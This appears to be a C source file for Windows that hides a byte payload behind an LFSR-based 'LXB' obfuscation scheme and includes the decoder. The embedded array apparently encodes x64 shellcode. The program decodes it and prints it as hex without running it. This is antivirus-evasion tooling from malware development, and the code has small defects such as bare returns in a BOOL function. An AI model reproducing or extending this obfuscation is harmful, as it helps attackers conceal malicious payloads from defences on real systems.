#include <Windows.h>
#include <stdio.h>

// LFSR function
unsigned int* lfsr(unsigned int  seed, unsigned int length) {
	unsigned int* sequence = (unsigned int*)malloc(sizeof(unsigned int) * length);
	unsigned int lfsrValue = seed;

	for (int i = 0; i < length; i++) {
		sequence[i] = lfsrValue%256;
		unsigned int feedback = lfsrValue & 1;
		lfsrValue >>= 1;
		if (feedback & 1) {
			lfsrValue ^= 0x110;
		}
	}

	return sequence;
}

// Function to deofuscate LXB payload
BOOL deofuscateLXB(IN int seed, IN INT* data, IN SIZE_T sSize, OUT PBYTE* pDeobfuscatedPayload) {
	BYTE* payload = NULL;

	// Allocate memory for deofuscated payload
	payload = (BYTE*)VirtualAlloc(NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (payload == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return;
	}

	// Deofuscate payload

	// Generate LFSR sequence with length of the payload and the key
	int* sequence = lfsr(seed, sSize);

	// Deofuscate payload
	for (int i = 0; i < sSize; i++) {
		// Check if the current integer is negative
		if (data[i] < 0) {
			// If it is negative, turn positive and add it to the payload
			payload[i] = (BYTE)(data[i] * -1);
		}
		else {
			// If it is positive, add it to the payload
			payload[i] = (BYTE)sequence[i];
		}
	}

	// Set deofuscated payload
	*pDeobfuscatedPayload = payload;

	return;
}

int data[] = { 251, -72, 248, 36, -240, -232, 182, 51, 51, 51, 89, 12, 89, 120, 8, 12, 127, -72, 46, 144, 197, -72, -139, 8, 183, -72, -139, 8, 65, -72, -139, 8, 54, -72, -139, 37, 120, -72, 254, -183, 116, 116, 151, 46, 206, -72, 42, 182, 201, -60, -97, 132, 58, 267, 54, 89, -193, 206, 23, 89, 69, -193, 112, 139, 8, 89, 226, -72, -139, 8, 54, -139, 49, -60, -72, 59, -208, -139, 181, 43, 51, 51, 51, -72, 7, 182, 207, -103, -72, 59, -208, 120, -139, -72, 65, 10, -139, 53, 54, 237, 69, -208, -227, 127, -72, -255, 206, 89, -139, 149, 43, -72, 59, -214, 151, 46, 206, -72, 42, 182, 201, 89, -193, 206, 23, 89, 59, -193, 13, -224, 26, 219, 173, 17, 173, 146, 56, 129, 38, 249, 82, 91, 200, 62, -139, 53, 146, 148, 59, -208, 235, 89, -139, 39, -72, 62, -139, 53, 75, 148, 59, -208, 89, -139, 57, 43, -72, 69, -208, 89, 200, 89, 266, -94, 243, 85, 89, 200, 89, 243, 89, 222, -72, 225, 20, 54, 89, 8, -255, -224, 266, 89, 243, 222, -72, -139, -18, 161, -87, -255, -255, -255, 154, -72, 208, 59, 51, 51, 51, 51, 51, 51, 51, -72, 126, 126, 69, 59, 51, 51, 89, 208, 42, -139, 246, -135, -255, 28, 274, -240, -181, 11, 202, 89, 208, 174, 84, 30, -157, -255, 28, -72, 225, 44, 114, -60, 187, 132, 6, 181, 138, -224, 82, 204, 274, 77, -19, 171, 246, 4, 51, 243, 89, 79, 239, -255, 28, 179, -97, 92, 179, -46, 197, -120, 197, 51 };

int seed = 195;

int main() {
	PBYTE pDeobfuscatedPayload = NULL;
	SIZE_T sDeobfuscatedSize = sizeof(data) / sizeof(int);

	// deofuscate payload
	deofuscateLXB(seed, data, sDeobfuscatedSize, &pDeobfuscatedPayload);

	// Print deofuscated in hex form
	for (int i = 0; i < sDeobfuscatedSize; i++) {
		printf("%02X ", pDeobfuscatedPayload[i]);
	}

	return 0;
}